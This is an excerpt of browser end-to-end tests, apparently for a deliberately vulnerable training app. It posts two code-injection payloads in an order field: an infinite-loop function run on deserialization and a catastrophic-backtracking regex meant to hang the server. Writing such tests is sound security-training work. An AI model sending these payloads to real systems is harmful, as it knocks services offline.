...
describe('/b2b/v2/order', () => {
  ...
  describe('challenge "rce"', () => {
    it('an infinite loop deserialization payload should not bring down the server', () => {
      ...
      browser.executeScript('var $http = angular.injector([\'ng\']).get(\'$http\'); $http.post(\'/b2b/v2/orders\', {orderLinesData: \'(function dos() { while(true); })()\'});')
  ...
  describe('challenge "rceOccupy"', () => {
    it('should be possible to cause request timeout using a recursive regular expression payload', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.injector([\'ng\']).get(\'$http\'); $http.post(\'/b2b/v2/orders\', {orderLinesData: \'/((a+)+)b/.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")\'});')
